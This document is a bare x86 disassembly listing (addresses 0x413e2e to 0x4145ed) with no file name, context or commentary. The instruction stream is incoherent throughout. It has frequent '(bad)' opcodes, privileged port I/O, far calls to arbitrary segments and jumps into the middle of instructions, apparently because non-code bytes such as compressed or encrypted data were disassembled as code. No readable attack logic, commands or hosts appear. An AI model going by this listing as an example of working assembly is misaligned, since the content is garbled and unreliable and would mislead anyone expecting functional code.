  413e2e:	pop    esi
  413e2f:	pop    ss
  413e30:	out    dx,eax
  413e31:	(bad)  
  413e32:	sbb    ebx,ebx
  413e34:	aam    0x65
  413e36:	inc    esi
  413e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e38:	adc    eax,0xaddf5f16
  413e3d:	in     al,dx
  413e3e:	mov    dh,0xc3
  413e40:	pop    ds
  413e41:	xchg   ebx,eax
  413e42:	jecxz  0x413e55
  413e44:	add    bh,BYTE PTR ds:0xff2bfd63
  413e4a:	xor    BYTE PTR [ecx+0xc],dh
  413e4d:	mov    al,0x71
  413e4f:	shl    edi,cl
  413e51:	mov    al,ds:0xdb801067
  413e56:	(bad)  
  413e57:	jmp    0x413ecb
  413e59:	inc    eax
  413e5a:	out    0x39,al
  413e5c:	inc    edx
  413e5d:	inc    edx
  413e5e:	gs lahf 
  413e60:	add    bh,dh
  413e62:	and    eax,DWORD PTR [ebp+0x39fa76c2]
  413e68:	jae    0x413edf
  413e6a:	pushf  
  413e6b:	mov    esi,0x5828a5ab
  413e70:	in     eax,dx
  413e71:	cmp    dh,dh
  413e73:	add    BYTE PTR [ecx],cl
  413e75:	xor    eax,0x6a6273f3
  413e7a:	enter  0x2138,0x6a
  413e7e:	mov    esi,0x587d6c95
  413e83:	add    eax,0x909a32aa
  413e88:	fisub  WORD PTR [eax-0x72]
  413e8b:	dec    edx
  413e8c:	(bad)  
  413e8d:	jmp    0x413e86
  413e8f:	jno    0x413eb0
  413e91:	out    dx,eax
  413e92:	stc    
  413e93:	enter  0x2207,0x39
  413e97:	push   es
  413e98:	jns    0x413e6f
  413e9a:	dec    ebp
  413e9b:	jnp    0x413ecc
  413e9d:	mov    BYTE PTR [eax],0xe0
  413ea0:	loop   0x413e26
  413ea2:	stc    
  413ea3:	cli    
  413ea4:	cld    
  413ea5:	lods   eax,DWORD PTR ds:[esi]
  413ea6:	lahf   
  413ea7:	out    0x4c,al
  413ea9:	stos   DWORD PTR es:[edi],eax
  413eaa:	popa   
  413eab:	add    esp,0x680f37cd
  413eb1:	push   ebx
  413eb2:	push   es
  413eb3:	push   ds
  413eb4:	dec    ecx
  413eb5:	or     al,0x7b
  413eb7:	mov    ds:0x18243815,eax
  413ebc:	add    DWORD PTR [eax+0x42],ebp
  413ebf:	lds    ebp,FWORD PTR [eax-0x70]
  413ec2:	fbstp  TBYTE PTR ds:0x81eda684
  413ec8:	fldcw  WORD PTR [edi-0xd187294]
  413ece:	mov    bl,0x80
  413ed0:	js     0x413f10
  413ed2:	adc    dh,BYTE PTR [ecx+0x66a88f6b]
  413ed8:	in     eax,dx
  413ed9:	xor    bh,BYTE PTR [ebx]
  413edb:	daa    
  413edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413edd:	push   edi
  413ede:	add    bh,BYTE PTR [esi+0x30]
  413ee1:	cmp    ah,BYTE PTR [esi+0x695473d7]
  413ee7:	scas   eax,DWORD PTR es:[edi]
  413ee8:	mov    esi,esp
  413eea:	es push ss
  413eec:	jbe    0x413ec2
  413eee:	mov    ah,0x16
  413ef0:	neg    ch
  413ef2:	xchg   ebx,eax
  413ef3:	jp     0x413ec3
  413ef5:	adc    al,0x5c
  413ef7:	mov    ds:0x1a7a662a,eax
  413efc:	sbb    cl,BYTE PTR [ebp-0x492ef4f8]
  413f02:	repnz ins BYTE PTR es:[edi],dx
  413f04:	or     ebx,DWORD PTR [ebp-0x22f07625]
  413f0a:	cwde   
  413f0b:	pop    ebx
  413f0c:	and    al,0xcb
  413f0e:	xor    BYTE PTR [eax],al
  413f10:	fimul  DWORD PTR [ecx-0x14]
  413f13:	data16 loopne 0x413e9a
  413f16:	and    eax,0x866622a
  413f1b:	jno    0x413f0f
  413f1d:	(bad)  
  413f1e:	stc    
  413f1f:	pop    edi
  413f20:	rol    DWORD PTR [esi],0x95
  413f23:	ins    BYTE PTR es:[edi],dx
  413f24:	mov    edi,0x6e39d233
  413f29:	fcomp  DWORD PTR [ecx]
  413f2b:	add    BYTE PTR [edi+0x6b],bh
  413f2e:	data16 adc al,0xab
  413f31:	scas   eax,DWORD PTR es:[edi]
  413f32:	test   edx,ebx
  413f34:	and    ebx,eax
  413f36:	mov    edx,DWORD PTR [edx+ebx*1]
  413f39:	adc    ebp,DWORD PTR [bp+di]
  413f3c:	popf   
  413f3d:	call   0x733ab980
  413f42:	lods   eax,DWORD PTR ds:[esi]
  413f43:	push   edi
  413f44:	sub    ah,BYTE PTR [edx-0x418f685d]
  413f4a:	scas   eax,DWORD PTR es:[edi]
  413f4b:	add    DWORD PTR [eax+ebp*8-0x63319d38],edi
  413f52:	xor    DWORD PTR [ecx+ebp*4-0x34],eax
  413f56:	xor    DWORD PTR [esi-0x79],ecx
  413f59:	pop    ebx
  413f5a:	xor    esi,eax
  413f5c:	fld    QWORD PTR [edx]
  413f5e:	mov    BYTE PTR [edx+0x3c],al
  413f61:	cdq    
  413f62:	jb     0x413f7f
  413f64:	ins    DWORD PTR es:[edi],dx
  413f65:	loop   0x413f67
  413f67:	mov    eax,ds:0xa7e74e6
  413f6c:	outs   dx,DWORD PTR ds:[esi]
  413f6d:	clc    
  413f6e:	dec    esp
  413f6f:	xchg   DWORD PTR [edi],eax
  413f71:	mov    edx,0x80c6bfdd
  413f76:	retf   0x5640
  413f79:	aaa    
  413f7a:	ficom  DWORD PTR [ecx]
  413f7c:	rcr    DWORD PTR [eax-0x6a2ca627],cl
  413f82:	retf   
  413f83:	out    0xff,eax
  413f85:	xchg   esi,eax
  413f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f87:	dec    eax
  413f88:	add    esi,eax
  413f8a:	mov    DWORD PTR [edi],edi
  413f8c:	mov    esi,0x9aae8b7
  413f91:	mov    ebp,0x89437bc6
  413f96:	cli    
  413f97:	call   0x1a1f:0xe200cb5
  413f9e:	mov    dl,0x4
  413fa0:	loop   0x413fda
  413fa2:	jo     0x414021
  413fa4:	ss xchg ebp,eax
  413fa6:	pusha  
  413fa7:	xor    ah,BYTE PTR [esi-0x7b4702df]
  413fad:	add    al,0xb5
  413faf:	jne    0x413f4d
  413fb1:	sbb    al,0x67
  413fb3:	sub    BYTE PTR [edx+0x2936ef8],bl
  413fb9:	and    ch,bh
  413fbb:	stc    
  413fbc:	mov    eax,ds:0x4d0f9e72
  413fc1:	retf   0x9684
  413fc4:	xlat   BYTE PTR ds:[ebx]
  413fc5:	xchg   esi,eax
  413fc6:	cmp    BYTE PTR [ecx-0x41],dh
  413fc9:	in     eax,dx
  413fca:	adc    BYTE PTR [ebp+0x1c49710b],dh
  413fd0:	dec    DWORD PTR [edi]
  413fd2:	mov    ?,WORD PTR [eax]
  413fd4:	fisubr WORD PTR [esi]
  413fd6:	outs   dx,BYTE PTR ds:[esi]
  413fd7:	add    eax,0x710ccce6
  413fdc:	sbb    esi,DWORD PTR [eax-0x59d184e5]
  413fe2:	mov    edi,0x415b41be
  413fe7:	xchg   DWORD PTR [edi+0xcfd9162],esi
  413fed:	test   BYTE PTR [eax-0x35d6fbe3],ch
  413ff3:	shl    DWORD PTR [esi],cl
  413ff5:	ss adc eax,0xd81229af
  413ffb:	inc    edi
  413ffc:	dec    edx
  413ffd:	out    dx,eax
  413ffe:	xchg   ecx,eax
  413fff:	lock pop esi
  414001:	ja     0x413fc7
  414003:	mov    dl,0x39
  414005:	push   ebp
  414006:	fist   WORD PTR [edx+0x6de64c72]
  41400c:	pushf  
  41400d:	out    0x78,eax
  41400f:	daa    
  414010:	mov    ds:0xf000eaf9,al
  414015:	cmp    BYTE PTR [eax-0x40],ch
  414018:	sub    DWORD PTR [esi+0xb],ebx
  41401b:	enter  0x9108,0x42
  41401f:	mov    BYTE PTR [esi+0x36f5af9f],0xb4
  414026:	or     esi,esi
  414028:	pop    ds
  414029:	ins    DWORD PTR es:[edi],dx
  41402a:	xor    al,0x7e
  41402c:	das    
  41402d:	jp     0x414027
  41402f:	scas   al,BYTE PTR es:[edi]
  414030:	adc    edi,DWORD PTR [esi+edi*2+0x64]
  414034:	jl     0x41406a
  414036:	mov    ecx,0x4daa0f0d
  41403b:	icebp  
  41403c:	jae    0x414037
  41403e:	in     al,0x3b
  414040:	int    0x1f
  414042:	and    DWORD PTR [edi+0x94397e3],esp
  414048:	xor    al,0x0
  41404a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41404b:	fdiv   st,st(4)
  41404d:	push   cs
  41404e:	sbb    DWORD PTR [ebp+0x36ef67b],edi
  414054:	mov    esi,0xa9f37b5f
  414059:	enter  0x2254,0xc9
  41405d:	sbb    eax,0x5393b842
  414062:	xor    al,BYTE PTR [ecx+0x7113e16e]
  414068:	outs   dx,DWORD PTR ds:[esi]
  414069:	popa   
  41406a:	or     al,0xea
  41406c:	add    eax,0x136618e0
  414071:	int3   
  414072:	or     ebp,DWORD PTR [ebp-0x6f]
  414075:	test   BYTE PTR [esi],al
  414077:	jecxz  0x414093
  414079:	call   0x44c7:0xbd6540e6
  414080:	imul   eax,DWORD PTR [edi-0x44],0x31a09d1f
  414087:	and    eax,0x7cca01d6
  41408c:	pop    edx
  41408d:	in     al,dx
  41408e:	enter  0x189b,0x56
  414092:	pop    ebx
  414093:	push   edx
  414094:	dec    esp
  414095:	sbb    BYTE PTR [edi-0x3],cl
  414098:	mov    eax,ds:0x80695ff9
  41409d:	daa    
  41409e:	call   0xd47f:0x5cf7fa2f
  4140a5:	xchg   esp,eax
  4140a6:	retf   0x41d6
  4140a9:	in     eax,dx
  4140aa:	push   esp
  4140ab:	outs   dx,BYTE PTR ds:[esi]
  4140ac:	adc    al,0xfb
  4140ae:	mov    bh,0x4e
  4140b0:	sub    bh,BYTE PTR [ebp-0x1a]
  4140b3:	xchg   edx,eax
  4140b4:	adc    DWORD PTR [edi],ebp
  4140b6:	lahf   
  4140b7:	mov    edx,0xa074704f
  4140bc:	dec    edi
  4140bd:	lahf   
  4140be:	pop    ds
  4140bf:	push   esi
  4140c0:	adc    eax,0xa4adefc7
  4140c5:	jmp    0x414068
  4140c7:	pop    ds
  4140c8:	pop    edx
  4140c9:	dec    edi
  4140ca:	je     0x414063
  4140cc:	add    dl,BYTE PTR [edi+esi*4]
  4140cf:	in     al,0xf6
  4140d1:	adc    eax,DWORD PTR [edx-0xc27fc]
  4140d7:	enter  0x6144,0xe8
  4140db:	ret    
  4140dc:	xchg   edx,eax
  4140dd:	mov    dh,0x63
  4140df:	mov    edx,0xb154f30
  4140e4:	dec    eax
  4140e5:	push   esi
  4140e6:	scas   al,BYTE PTR es:[edi]
  4140e7:	aam    0x98
  4140e9:	pop    edx
  4140ea:	dec    edx
  4140eb:	int    0xcd
  4140ed:	fdivr  st,st(3)
  4140ef:	mov    cl,0x8e
  4140f1:	inc    ecx
  4140f2:	fist   WORD PTR [eax]
  4140f4:	icebp  
  4140f5:	nop
  4140f6:	fadd   DWORD PTR [ebp+0xa]
  4140f9:	sbb    eax,0x1f434a86
  4140fe:	jnp    0x414128
  414100:	jl     0x414161
  414102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414103:	mov    WORD PTR [esi-0x438ae6e1],ds
  414109:	sub    al,ah
  41410b:	jo     0x4140c3
  41410d:	push   cs
  41410e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414110:	sar    BYTE PTR [ebx],cl
  414112:	std    
  414113:	imul   edi,DWORD PTR [ecx+0x198eab27],0x46458b8a
  41411d:	int3   
  41411e:	xor    edx,esp
  414120:	or     eax,0x463f9763
  414125:	pop    edx
  414126:	das    
  414127:	xor    al,0x28
  414129:	xchg   DWORD PTR cs:[esi-0xf0f52f5],edi
  414130:	cmp    DWORD PTR [eax],edx
  414132:	sbb    eax,0x57bef202
  414137:	push   0xd0e187c0
  41413c:	(bad)  
  41413d:	and    ah,BYTE PTR [ebx]
  41413f:	mov    esi,0x167a0487
  414144:	xor    DWORD PTR [edx+0x5e5dabb8],edi
  41414a:	jge    0x4140da
  41414c:	mov    edi,DWORD PTR [ecx-0x7b99ab3a]
  414152:	sbb    ecx,esp
  414154:	inc    eax
  414155:	and    ecx,DWORD PTR [edi-0x4d]
  414158:	mov    BYTE PTR [edi+0x1e],cl
  41415b:	cmp    ebp,edi
  41415d:	fist   DWORD PTR [ebx+0x11]
  414160:	mov    dh,0xbd
  414162:	hlt    
  414163:	pop    eax
  414164:	std    
  414165:	jb     0x41412b
  414167:	add    bl,BYTE PTR [ebp-0x62]
  41416a:	aad    0xf9
  41416c:	in     eax,dx
  41416d:	(bad)  
  41416e:	push   ebp
  41416f:	mov    bh,0xb0
  414171:	popf   
  414172:	js     0x41412d
  414174:	inc    ecx
  414175:	test   al,0xb5
  414177:	lods   al,BYTE PTR ds:[esi]
  414178:	cwde   
  414179:	adc    al,0x66
  41417b:	arpl   WORD PTR [ebx-0x67],di
  41417e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41417f:	mov    ah,0x95
  414181:	out    0xc,eax
  414183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414184:	mov    edi,DWORD PTR [ecx]
  414186:	and    eax,0x2b3a1039
  41418b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41418c:	add    bl,BYTE PTR [ebx+0x6f]
  41418f:	push   esi
  414190:	pusha  
  414191:	stos   WORD PTR es:[edi],ax
  414193:	push   esp
  414194:	dec    esi
  414195:	cwde   
  414196:	xor    al,BYTE PTR [edx+0x72]
  414199:	adc    ch,al
  41419b:	loope  0x4141f1
  41419d:	push   esi
  41419e:	xor    al,0xf7
  4141a0:	mov    ecx,0xb151f644
  4141a5:	and    BYTE PTR [edx-0x340b43ff],cl
  4141ab:	loop   0x4141a7
  4141ad:	into   
  4141ae:	push   ss
  4141af:	shl    BYTE PTR [edx-0x71],0x50
  4141b3:	cdq    
  4141b4:	out    dx,eax
  4141b5:	mov    al,ds:0xfc7da173
  4141ba:	or     BYTE PTR [eax+0x3a],0x48
  4141be:	sbb    eax,0xbcbced7b
  4141c3:	mov    bh,0x7
  4141c5:	fidivr WORD PTR [ebx+0x1]
  4141c8:	hlt    
  4141c9:	scas   al,BYTE PTR es:[edi]
  4141ca:	test   al,0x2b
  4141cc:	add    al,0x2c
  4141ce:	arpl   cx,sp
  4141d0:	in     eax,dx
  4141d1:	and    DWORD PTR [edi+0x23],ebx
  4141d4:	aad    0x3b
  4141d6:	test   eax,0x78f8d399
  4141db:	enter  0xd2ae,0x41
  4141df:	jp     0x414237
  4141e1:	bound  ebp,QWORD PTR [eax-0x1d]
  4141e4:	stc    
  4141e5:	sub    ebx,DWORD PTR ds:0xebd691e4
  4141eb:	push   ebx
  4141ec:	sub    eax,0xaccb79b4
  4141f1:	push   es
  4141f2:	push   ss
  4141f3:	cli    
  4141f4:	cmp    eax,DWORD PTR [ecx-0x5aaa0d95]
  4141fa:	push   ebx
  4141fb:	or     eax,0x58ce9a95
  414200:	pop    esp
  414201:	push   ds
  414202:	pop    ebx
  414203:	je     0x414266
  414205:	enter  0x4c76,0xd1
  414209:	dec    ebx
  41420a:	jb     0x414220
  41420c:	shl    BYTE PTR [ebx],cl
  41420e:	jge    0x4141ac
  414210:	push   eax
  414211:	mov    ebx,0x89bd116e
  414216:	out    0x0,eax
  414218:	in     al,0xe6
  41421a:	cmp    BYTE PTR [ebp+0x5],al
  41421d:	add    bh,BYTE PTR [edi]
  41421f:	mov    ah,0x1b
  414221:	ss out dx,eax
  414223:	outs   dx,BYTE PTR ds:[esi]
  414224:	mov    esi,0x63cf6e8d
  414229:	inc    al
  41422b:	popa   
  41422c:	mov    eax,0x48067058
  414231:	xchg   esp,eax
  414232:	xor    eax,0xbc1b20b0
  414237:	aad    0x43
  414239:	cwde   
  41423a:	push   esi
  41423b:	and    DWORD PTR [edi],edi
  41423d:	in     al,dx
  41423e:	push   0xffffffaa
  414240:	lock pop es
  414242:	mov    ah,0x43
  414244:	sub    eax,0x3211d4e2
  414249:	jl     0x4142ad
  41424b:	mov    cl,0xf1
  41424d:	xor    DWORD PTR [esi],0x7d334d6d
  414253:	jle    0x41421a
  414255:	leave  
  414256:	test   DWORD PTR [ecx],ecx
  414258:	dec    esi
  414259:	fldcw  WORD PTR [edi]
  41425b:	test   al,0x34
  41425d:	lock mov al,0x28
  414260:	sub    esi,DWORD PTR [esi-0x57]
  414263:	xchg   ebp,eax
  414264:	hlt    
  414265:	xchg   esi,eax
  414266:	aaa    
  414267:	je     0x4141f9
  414269:	out    0x6f,al
  41426b:	lock sub al,0x1a
  41426e:	test   eax,0x3c06f8b9
  414273:	push   ds
  414274:	imul   edx,DWORD PTR es:[edi-0x6a282d38],0xffffffb3
  41427c:	icebp  
  41427d:	ja     0x41425a
  41427f:	repnz test eax,eax
  414282:	jmp    0x11f2:0xab571e8b
  414289:	inc    edx
  41428a:	xchg   ebp,eax
  41428b:	in     eax,dx
  41428c:	jmp    DWORD PTR [ebx+0x488fa6d4]
  414292:	mov    bh,0x13
  414294:	or     BYTE PTR [ecx-0x7390f32c],ah
  41429a:	cmp    eax,0x6a6b3ff3
  4142a0:	call   0xe084f005
  4142a5:	out    dx,al
  4142a6:	lahf   
  4142a7:	in     al,dx
  4142a8:	xchg   edx,eax
  4142a9:	mov    dh,0x1a
  4142ab:	push   0xffffffae
  4142ad:	inc    ecx
  4142ae:	ds xchg esp,eax
  4142b0:	dec    esi
  4142b1:	fistp  QWORD PTR [eax]
  4142b3:	pusha  
  4142b4:	and    BYTE PTR [eax+0x5c],dh
  4142b7:	push   ds
  4142b8:	shl    eax,cl
  4142ba:	pushf  
  4142bb:	and    al,BYTE PTR [ebx]
  4142bd:	xlat   BYTE PTR ds:[ebx]
  4142be:	(bad)  
  4142bf:	and    al,0x52
  4142c1:	sbb    BYTE PTR [edx],dh
  4142c3:	push   ebp
  4142c4:	xor    BYTE PTR [esi-0x15ae565e],0x89
  4142cb:	mov    ds:0xc25c2e20,al
  4142d0:	popf   
  4142d1:	les    edi,FWORD PTR [ecx-0x294b1542]
  4142d7:	jl     0xcb2332a4
  4142dd:	cmp    eax,0x455dda14
  4142e2:	cmp    bl,BYTE PTR [edi+0x4]
  4142e5:	add    ah,BYTE PTR [ecx]
  4142e7:	(bad)  
  4142e8:	pusha  
  4142e9:	adc    dl,BYTE PTR [eax+0x61f1563f]
  4142ef:	push   edi
  4142f0:	in     eax,dx
  4142f1:	call   0xf499:0xb7864e8e
  4142f8:	into   
  4142f9:	mov    dl,0x55
  4142fc:	inc    edi
  4142fd:	sub    BYTE PTR [edi-0x3b572c8a],cl
  414303:	sub    bh,BYTE PTR [ebp+0x7562ddb7]
  414309:	sub    BYTE PTR [edi+0x6c],al
  41430c:	test   eax,0xea6621ec
  414311:	dec    eax
  414312:	mov    bh,0x4b
  414314:	scas   eax,DWORD PTR es:[edi]
  414315:	push   ebx
  414316:	sbb    ecx,DWORD PTR [esi-0x2a]
  414319:	mov    BYTE PTR [edx],ah
  41431b:	bound  eax,QWORD PTR [esp+ebx*8-0x1e819eae]
  414322:	pop    eax
  414323:	ffree  st(5)
  414325:	mov    ecx,0xce371363
  41432a:	adc    ecx,DWORD PTR [ecx+0xd]
  41432d:	iret   
  41432e:	int    0x39
  414330:	xlat   BYTE PTR ds:[ebx]
  414331:	fst    QWORD PTR [edi-0x6f]
  414334:	mov    al,0xaf
  414336:	cmp    edi,DWORD PTR [edi]
  414338:	mov    ds,WORD PTR [eax+0xb]
  41433b:	aaa    
  41433c:	or     bl,BYTE PTR ds:0xbd752b8d
  414342:	push   cs
  414343:	pop    ds
  414344:	ret    0xa6a0
  414347:	sbb    DWORD PTR [eax+esi*2+0x1e06663b],0x53
  41434f:	adc    al,0xf6
  414351:	ret    
  414352:	dec    ebx
  414353:	shl    BYTE PTR [ebx+ecx*1-0x4a],1
  414357:	shl    ebp,cl
  414359:	jp     0x4143d8
  41435b:	cmp    DWORD PTR [edx],0x68
  41435e:	jg     0x4142fe
  414360:	das    
  414361:	js     0x4142f1
  414363:	aad    0x56
  414365:	xor    al,bh
  414367:	iret   
  414368:	sub    eax,DWORD PTR [eax]
  41436a:	inc    edi
  41436b:	fiadd  DWORD PTR [ebx-0x6dfd7410]
  414371:	loop   0x41430e
  414373:	repz (bad) 
  414376:	mov    edi,0x18129f91
  41437b:	ss jae 0x4143cf
  41437e:	inc    ebx
  41437f:	in     eax,0x20
  414381:	dec    eax
  414382:	icebp  
  414383:	outs   dx,BYTE PTR ds:[esi]
  414384:	pop    eax
  414385:	mov    edx,0xa493cd40
  41438a:	shl    ch,1
  41438c:	in     eax,0xaa
  41438e:	jle    0x4143dd
  414390:	popa   
  414391:	xor    BYTE PTR [edi-0x7a8b2fff],dh
  414397:	mov    cs,eax
  414399:	setb   ah
  41439c:	outs   dx,DWORD PTR ds:[esi]
  41439d:	dec    ecx
  41439e:	aaa    
  41439f:	bound  edx,QWORD PTR [esi+0x2fd76235]
  4143a5:	pop    ecx
  4143a6:	mov    ebp,0x5af44218
  4143ab:	pushf  
  4143ac:	mov    ecx,0x150644a0
  4143b1:	xchg   ebx,eax
  4143b2:	stc    
  4143b3:	rcr    BYTE PTR [ecx-0x65],0x54
  4143b7:	jg     0x4143ae
  4143b9:	sbb    eax,0x931650ae
  4143be:	push   ebx
  4143bf:	mov    eax,0x243dbecc
  4143c4:	adc    dh,BYTE PTR [ebp+0x4e]
  4143c7:	repz and eax,0xe4a96b88
  4143cd:	add    BYTE PTR [ebp-0x30b94fa9],ah
  4143d3:	or     DWORD PTR [ecx],eax
  4143d5:	outs   dx,BYTE PTR ds:[esi]
  4143d6:	cmp    bh,dl
  4143d8:	mov    al,ds:0x73785694
  4143dd:	cld    
  4143de:	scas   eax,DWORD PTR es:[edi]
  4143df:	push   edx
  4143e0:	fbstp  TBYTE PTR [ebp-0x491a5709]
  4143e6:	clc    
  4143e7:	push   esp
  4143e8:	outs   dx,DWORD PTR ds:[esi]
  4143e9:	out    0x28,eax
  4143eb:	int    0x2a
  4143ed:	daa    
  4143ee:	ret    
  4143ef:	lods   eax,DWORD PTR ds:[esi]
  4143f0:	mov    ah,0xa8
  4143f2:	jmp    0xc3e1f495
  4143f7:	mov    esp,0x9b68d9df
  4143fc:	int3   
  4143fd:	daa    
  4143fe:	ror    BYTE PTR [edi-0x65a09166],1
  414404:	adc    bl,ch
  414406:	push   esp
  414407:	sub    DWORD PTR [eax-0x30],eax
  41440a:	cmp    dl,al
  41440c:	iret   
  41440d:	xchg   BYTE PTR [ecx+esi*4-0x2c5722f8],dl
  414414:	repnz dec edi
  414416:	gs xchg esi,eax
  414418:	and    eax,0x1cf37d78
  41441d:	add    al,0xac
  41441f:	stos   BYTE PTR es:[edi],al
  414420:	addr16 push 0xf62a174c
  414426:	icebp  
  414427:	jns    0x4143e4
  414429:	mov    ah,0x44
  41442b:	adc    dh,bl
  41442d:	mov    ds:0xcb2b3bc5,al
  414432:	int3   
  414433:	inc    esp
  414434:	imul   edi,DWORD PTR [ebx],0xffffffd0
  414437:	in     al,0xab
  414439:	and    ch,BYTE PTR [edi+0x5fb258e3]
  41443f:	arpl   WORD PTR [esi+edi*1],ax
  414442:	or     DWORD PTR [esi+0x31d59243],edx
  414448:	jb     0x4144c2
  41444a:	mov    al,0x85
  41444c:	jno    0x4143cf
  41444e:	push   ecx
  41444f:	imul   ebp,DWORD PTR [ebp+0x43],0x98b0ec2c
  414456:	mov    eax,0x61ee6c52
  41445b:	mov    eax,DWORD PTR [eax]
  41445d:	cs (bad) 
  41445f:	pop    esi
  414460:	and    esp,ecx
  414462:	aaa    
  414463:	mov    ah,0xad
  414465:	push   ebx
  414466:	dec    ebp
  414467:	inc    edi
  414468:	mov    ah,0xb6
  41446a:	ja     0x4144a5
  41446c:	retf   0x499e
  41446f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414470:	cmp    BYTE PTR [ebx],bl
  414472:	in     eax,dx
  414473:	int    0x64
  414475:	and    ecx,DWORD PTR [esi-0x717faceb]
  41447b:	and    dl,BYTE PTR [eax]
  41447d:	(bad)  
  41447e:	sbb    edx,DWORD PTR [ecx-0x9]
  414481:	fstp   st(5)
  414483:	out    dx,eax
  414484:	mov    DWORD PTR [eax+0x5],edx
  414487:	cmp    bh,BYTE PTR [edx-0x61]
  41448a:	cmp    eax,0x3b6bbd8a
  41448f:	adc    al,BYTE PTR [ebx+edi*2+0x5f87e6b1]
  414496:	sub    ebx,DWORD PTR [edi]
  414498:	enter  0x34ae,0x50
  41449c:	clc    
  41449d:	adc    eax,0x4be64f5d
  4144a2:	push   cs
  4144a3:	push   esp
  4144a4:	and    BYTE PTR [ebp+0x32a80860],dh
  4144aa:	popf   
  4144ab:	mov    DWORD PTR [eax-0x31],edx
  4144ae:	or     dh,BYTE PTR [edi+eax*8-0x62]
  4144b2:	jne    0x414446
  4144b4:	jl     0x414450
  4144b6:	add    al,BYTE PTR [edi+0x4d3d067a]
  4144bc:	(bad)  
  4144bd:	enter  0x3cb8,0x8d
  4144c1:	repnz add eax,DWORD PTR [edx-0x28]
  4144c5:	or     esi,DWORD PTR [ecx+0xa8f8e60]
  4144cb:	add    DWORD PTR [ebx-0xda286bb],eax
  4144d1:	push   edx
  4144d2:	sbb    al,0xa
  4144d4:	pop    ebp
  4144d5:	push   ebp
  4144d6:	mov    ah,0xd7
  4144d8:	inc    edx
  4144d9:	in     eax,dx
  4144da:	int3   
  4144db:	in     eax,0x98
  4144dd:	xchg   edi,eax
  4144de:	pop    edi
  4144df:	inc    ebx
  4144e0:	jge    0x4144be
  4144e2:	sub    eax,0x4b78fb20
  4144e7:	adc    eax,0xfeac7c58
  4144ec:	pop    esp
  4144ed:	sub    cl,ch
  4144ef:	cwde   
  4144f0:	xchg   edx,eax
  4144f1:	aad    0x7c
  4144f3:	xchg   edi,eax
  4144f4:	pop    es
  4144f5:	popf   
  4144f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f7:	adc    ch,al
  4144f9:	inc    eax
  4144fa:	jle    0x41451e
  4144fc:	mov    ebx,0x737216f8
  414501:	pusha  
  414502:	xor    DWORD PTR [eax+edx*1],esp
  414505:	sbb    al,0xe8
  414507:	rcr    bl,1
  414509:	ret    
  41450a:	cmp    DWORD PTR [ecx+0x43],ebx
  41450d:	(bad)  
  41450e:	xor    esp,DWORD PTR es:[eax]
  414511:	in     al,dx
  414512:	add    edi,edx
  414514:	shr    al,1
  414516:	inc    ebx
  414517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414518:	pusha  
  414519:	cmp    ebp,ebx
  41451b:	loopne 0x414510
  41451d:	push   ebx
  41451e:	jmp    DWORD PTR [eax+eax*4-0x4a]
  414522:	and    cl,BYTE PTR [edx]
  414524:	pop    edx
  414525:	test   ch,al
  414527:	cmp    BYTE PTR [eax-0x5890e5a8],bl
  41452d:	(bad)  
  41452e:	std    
  41452f:	mov    WORD PTR [edi-0x27f5d218],es
  414535:	lock sub ebp,ebx
  414538:	iret   
  414539:	fwait
  41453a:	sub    ebp,edi
  41453c:	dec    edi
  41453d:	int3   
  41453e:	ss push edi
  414540:	cmp    BYTE PTR [ebx+0x16ebb5cb],dh
  414546:	pop    ebp
  414547:	stc    
  414548:	xlat   BYTE PTR ds:[ebx]
  414549:	jecxz  0x414527
  41454b:	and    esi,DWORD PTR [ecx]
  41454d:	es xchg ebp,eax
  41454f:	and    DWORD PTR [esi+0xaa2ce0f],ecx
  414555:	sbb    al,BYTE PTR [edi+edi*8]
  414558:	jmp    0x7bdfefb1
  41455d:	lea    eax,[ecx+0x17a10f49]
  414563:	rol    BYTE PTR [eax+eax*1],0x5f
  414567:	pop    ecx
  414568:	(bad)  
  414569:	aas    
  41456a:	jmp    0xec51408c
  41456f:	fmul   QWORD PTR [edi]
  414571:	call   0x44a9:0xcd4ff166
  414578:	das    
  414579:	fisttp WORD PTR [edx-0x5c]
  41457c:	adc    ah,BYTE PTR [edx+ecx*4-0x43]
  414580:	cwde   
  414581:	sbb    cl,BYTE PTR [eax-0x512efb7]
  414587:	mov    dl,0xab
  414589:	dec    edx
  41458a:	lods   al,BYTE PTR ds:[esi]
  41458b:	retf   
  41458c:	push   0x8adc90da
  414591:	into   
  414592:	or     edi,DWORD PTR [esi-0x40074e8a]
  414598:	xchg   ecx,eax
  414599:	jg     0x41455d
  41459b:	pop    ebp
  41459c:	mul    BYTE PTR [edi]
  41459e:	mov    DWORD PTR [ebp-0x39],esp
  4145a1:	fwait
  4145a2:	inc    edx
  4145a3:	dec    edi
  4145a4:	call   0xb975:0xd34dfd
  4145ab:	xor    al,0x14
  4145ad:	adc    al,al
  4145af:	out    dx,al
  4145b0:	mov    bl,0x97
  4145b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b3:	cld    
  4145b4:	pop    ebp
  4145b5:	ins    BYTE PTR es:[edi],dx
  4145b6:	in     al,0xe7
  4145b8:	sub    al,0xf1
  4145ba:	xor    al,0x16
  4145bc:	push   ds
  4145bd:	cmp    DWORD PTR [edi-0x17feecb6],ebp
  4145c3:	add    eax,0x2fba94b5
  4145c8:	pushf  
  4145c9:	pop    esi
  4145ca:	cmp    DWORD PTR [edi*2-0x1877b730],0xffffffd2
  4145d2:	mov    DWORD PTR [esi+edi*1+0x25dcb8ee],ecx
  4145d9:	mov    ds:0x7632b91e,eax
  4145de:	pop    esp
  4145df:	getsec 
  4145e1:	icebp  
  4145e2:	and    eax,0x6623031f
  4145e7:	cwde   
  4145e8:	shr    DWORD PTR [edx],cl
  4145ea:	test   al,0x99
  4145ec:	outs   dx,BYTE PTR ds:[esi]
  4145ed:	mov    esp,DWORD PTR [ecx+edi*2+0x513ea739]
